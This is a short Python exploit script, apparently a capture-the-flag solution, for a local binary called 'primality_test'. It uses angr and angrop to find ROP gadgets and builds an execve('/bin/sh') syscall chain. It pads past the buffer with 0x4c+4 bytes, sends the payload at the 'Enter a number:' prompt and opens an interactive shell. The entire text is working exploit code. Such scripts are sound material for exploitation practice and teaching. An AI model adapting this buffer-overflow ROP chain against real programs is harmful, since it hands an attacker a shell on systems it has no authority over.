"""
Un po' di documentazione qua?
"""

import angr
import angrop
from pwn import *

file_path = 'primality_test'

EXE_FILE = file_path
exe = ELF(EXE_FILE)
# print(exe.symbols['/bin/sh'])

p = angr.Project(file_path)
rop = p.analyses.ROP()
rop.find_gadgets()

# chain = rop.set_regs(ebx=0x08048991, ecx=0x0, edx=0x0)
# arg0: %ebx, arg1: %ecx, arg2: %edx, arg3: %esi, arg4: %edi, arg5: %ebp
bin_string = 0x08048991
chain = rop.do_syscall(11, [bin_string, 0x0, 0x0])

chain.print_payload_code()
ropchain = b'A'*(0x4c + 4) + chain.payload_str()
print(chain.payload_str())
io = process([EXE_FILE])
# io.recvline()
io.sendlineafter(b'Enter a number: ', ropchain)
io.interactive()
